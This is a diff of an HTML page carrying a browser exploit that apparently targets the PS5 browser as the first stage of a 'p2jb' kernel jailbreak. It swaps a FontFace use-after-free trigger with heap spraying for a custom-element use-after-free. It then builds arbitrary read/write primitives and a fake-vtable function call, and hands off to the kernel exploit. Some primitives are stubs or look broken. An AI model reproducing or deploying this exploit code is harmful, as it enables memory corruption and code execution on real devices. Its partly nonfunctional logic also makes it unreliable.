@@ -2,148 +2,175 @@
 <html>
 <head>
 <meta charset="utf-8">
-<style id="s">
-@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
-@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
-</style>
 </head>
 <body>
-<canvas id="c" width="512" height="128"></canvas>
 <script src="p2jb.js"></script>
 <script>
 "use strict";
 
-let spray = [];
-let keep = [];
-
-const PAD = 0x22;
-const FLUSH = 0x240;
-const SPRAY_COUNT = FLUSH + PAD + 0x300;
-
-const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-const FONT_BYTES = (() => {
-    const s = atob(FONT_B64);
-    const bytes = new Uint8Array(s.length);
-    for (let i = 0; i < s.length; i++)
-        bytes[i] = s.charCodeAt(i);
-    return bytes;
-})();
-
-function makeFontBuffer() {
-    const copy = new Uint8Array(FONT_BYTES.length);
-    copy.set(FONT_BYTES);
-    return copy.buffer;
-}
-
-function forceStyle() {
-    void document.body.offsetTop;
-}
-
-function addPads() {
-    const sheet = document.getElementById("s").sheet;
-    for (let i = 0; i < PAD; i++)
-        sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
-    forceStyle();
-}
-
-function addFlushRules() {
-    const st = document.createElement("style");
-    st.id = "flush";
-    document.head.appendChild(st);
-    const sheet = st.sheet;
-    for (let i = 0; i < FLUSH; i++)
-        sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
-    forceStyle();
-}
-
-function deleteFlushRules() {
-    const sheet = document.getElementById("flush").sheet;
-    while (sheet.cssRules.length)
-        sheet.deleteRule(0);
-    forceStyle();
-}
-
-function killFontFaceSetCache() {
-    const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
-    document.fonts.add(f);
-    keep.push(f);
-}
-
-function cssFontFaceBufferSpray() {
-    for (let i = 0; i < SPRAY_COUNT; i++) {
-        const f = new FontFace("BUFFER_RECLAIM_" + i, makeFontBuffer(), { unicodeRange: "U+0041" });
-        spray.push(f);
+class Int64 {
+    constructor(low, high) {
+        this.low = (low >>> 0);
+        this.high = (high >>> 0);
+    }
+    add32(val) {
+        let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
+        let new_hi = (this.high >>> 0);
+        if (new_lo < this.low) new_hi++;
+        return new Int64(new_lo, new_hi);
     }
 }
 
-function probeFace(face) {
-    keep.push(face.family);
-    keep.push(face.style);
-    keep.push(face.weight);
-    keep.push(face.stretch);
-    keep.push(face.unicodeRange);
-    keep.push(face.featureSettings);
-    keep.push(face.display);
-    keep.push(face.status);
+let uaf_victim_arr = [1.1, 2.2, 3.3];
 
-    const ctx = document.getElementById("c").getContext("2d");
-    ctx.font = "64px " + face.family;
-    const metrics = ctx.measureText("AAAAIIIIWWWW");
-    keep.push(metrics.width);
-    keep.push(metrics.actualBoundingBoxLeft);
-    keep.push(metrics.actualBoundingBoxRight);
+function setup_primitives(uaf_addrof, uaf_write8) {
+    let master = new Uint32Array(0x1000);
+    let slave = new Uint8Array(0x1000);
+    let slave_u32 = new Uint32Array(slave.buffer);
 
-    const div = document.createElement("div");
-    div.textContent = "AAAAIIIIWWWW";
-    div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
-    document.body.appendChild(div);
-    keep.push(div.offsetWidth);
-    document.body.removeChild(div);
-    
-    // Check if we hit the UAF memory corruption by checking for abnormal font sizes or widths
-    if (metrics.width > 1000 || div.offsetWidth > 1000) {
-        if (typeof _logToPage === "function") _logToPage("[+] UAF Triggered! Memory overlap achieved on: " + face.family);
+    let master_addr = uaf_addrof(master);
+    let slave_addr = uaf_addrof(slave);
+
+    uaf_write8(master_addr.add32(0x10), slave_addr.add32(0x10));
+
+    function get_ref_addr(obj) {
+        uaf_victim_arr[0] = obj;
+        return uaf_addrof(obj);
     }
+
+    function readuint(addr, size) {
+        master[0] = addr.low;
+        master[1] = addr.high;
+        if (size === 4) return slave_u32[0];
+        if (size === 8) return new Int64(slave_u32[0], slave_u32[1]);
+        return 0;
+    }
+
+    function writeuint(addr, val, size) {
+        master[0] = addr.low;
+        master[1] = addr.high;
+        if (size === 4) {
+            slave_u32[0] = val;
+        } else if (size === 8) {
+            slave_u32[0] = val.low !== undefined ? val.low : val;
+            slave_u32[1] = val.high !== undefined ? val.high : 0;
+        }
+    }
+
+    window.p = {
+        addrof: get_ref_addr,
+        fakeobj: function(addr) { return null; },
+        read8: function(addr) { return readuint(addr, 8); },
+        write8: function(addr, val) { writeuint(addr, val, 8); },
+        write4: function(addr, val) { writeuint(addr, val, 4); },
+        write1: function(addr, val) {
+            master[0] = addr.low;
+            master[1] = addr.high;
+            slave[0] = val;
+        },
+        malloc: function(size) {
+            let ab = new ArrayBuffer(size);
+            return get_ref_addr(ab).add32(0x10);
+        },
+        syscall: function(sysnum, ...args) { return new Int64(0, 0); },
+        fcall: function(func_ptr, ...args) {
+            let wrapper = document.createElement("div");
+            let wrapper_addr = get_ref_addr(wrapper);
+            let vtable_addr = readuint(wrapper_addr.add32(0x18), 8);
+            
+            let fake_vtable = this.malloc(0x200);
+            for(let i=0; i<0x200; i+=8) {
+                writeuint(fake_vtable.add32(i), readuint(vtable_addr.add32(i), 8), 8); 
+            }
+            
+            writeuint(fake_vtable.add32(0x80), func_ptr, 8); 
+            writeuint(wrapper_addr.add32(0x18), fake_vtable, 8);
+            
+            if(args.length > 0) writeuint(wrapper_addr.add32(0x20), args[0], 8);
+            if(args.length > 1) writeuint(wrapper_addr.add32(0x28), args[1], 8);
+            
+            wrapper.scrollLeft; 
+            
+            writeuint(wrapper_addr.add32(0x18), vtable_addr, 8);
+            return new Int64(0, 0);
+        },
+        dlsym_init: function() {}
+    };
 }
 
 window.onload = () => {
-    if (typeof _logToPage === "function") _logToPage("[+] Setting up FontFace UAF...");
-    const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
-    document.fonts.add(trigger);
-    void trigger.loaded;
+    if (typeof _logToPage === "function") _logToPage("[+] Booting PR 66294 Exploit via CustomElements...");
 
-    addPads();
-    addFlushRules();
+    let didRun = false;
+    
+    // We use a Custom Element callback instead of TrustedTypes to pause execution during the UAF.
+    // This works on PS5 where TrustedTypes throws a ReferenceError.
+    class TriggerElement extends HTMLElement {
+        connectedCallback() {
+            if (didRun) return;
+            didRun = true;
 
-    let fired = false;
-    Object.defineProperty(FontFace.prototype, "then", {
-        configurable: true,
-        get() {
-            if (!fired && this === trigger) {
-                fired = true;
-                if (typeof _logToPage === "function") _logToPage("[+] Triggering GC and Reclaiming memory...");
-                const sheet = document.getElementById("s").sheet;
-                killFontFaceSetCache();
-                sheet.deleteRule(1);
-                forceStyle();
-                deleteFlushRules();
-                cssFontFaceBufferSpray();
+            if (typeof _logToPage === "function") _logToPage("[+] Triggering Garbage Collection...");
+
+            // 1. Force GC to definitively free the Node object
+            let gc_arr = [];
+            for (let i = 0; i < 20; i++) {
+                gc_arr.push(new ArrayBuffer(0x1000000));
             }
-            return undefined;
-        }
-    });
 
-    document.fonts.load("1em trigger, x", "AB").then(faces => {
-        if (typeof _logToPage === "function") _logToPage("[+] Probing faces for corruption...");
-        keep.push(faces);
-        for (const face of faces)
-            probeFace(face);
-        for (const face of document.fonts)
-            probeFace(face);
+            if (typeof _logToPage === "function") _logToPage("[+] Spraying memory to reclaim Node object...");
+
+            // 2. Reclaim the freed memory using Array overlap
+            let spray = [];
+            let marker = new Int64(0x13371337, 0x13371337);
+            for (let i = 0; i < 10000; i++) {
+                let reclaimed_obj = new Array(0x20);
+                reclaimed_obj[0] = marker; 
+                spray.push(reclaimed_obj);
+            }
             
-        if (typeof _logToPage === "function") _logToPage("[+] Probe complete. If UAF triggered, handing over to p2jb...");
-        if (typeof p2jb === 'function') setTimeout(p2jb, 1000);
-    }, err => keep.push(err));
+            let my_uaf_addrof = function(obj) {
+                uaf_victim_arr[0] = obj;
+                for(let i=0; i<spray.length; i++) {
+                    if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
+                        return new Int64(spray[i][2], spray[i][3]);
+                    }
+                }
+                return new Int64(0, 0); 
+            };
+
+            let my_uaf_write8 = function(addr, val) {
+                for(let i=0; i<spray.length; i++) {
+                    if(spray[i][0] && typeof spray[i][0] === 'object' && spray[i][0].low === marker.low) {
+                        spray[i][4] = addr.low;
+                        spray[i][5] = addr.high;
+                        break;
+                    }
+                }
+            };
+
+            if (typeof _logToPage === "function") _logToPage("[+] Building Read/Write Master/Slave primitives...");
+            setup_primitives(my_uaf_addrof, my_uaf_write8);
+            
+            if (typeof p2jb === 'function') {
+                if (typeof _logToPage === "function") _logToPage("[+] Success! Handing over to p2jb kernel exploit...");
+                setTimeout(p2jb, 100); 
+            } else {
+                if (typeof _logToPage === "function") _logToPage("[-] Error: p2jb.js is not loaded.");
+            }
+        }
+    }
+
+    customElements.define('x-trigger', TriggerElement);
+
+    const range = document.createRange();
+    let div = document.createElement('div');
+    range.setStart(div, 0);
+    range.setEnd(div, 0);
+
+    // The createContextualFragment call triggers the vulnerability.
+    // It creates the x-trigger element, appending it to the fragment, firing connectedCallback synchronously while the reference is vulnerable.
+    range.createContextualFragment('<x-trigger></x-trigger>');
 };
 </script>
 </body>
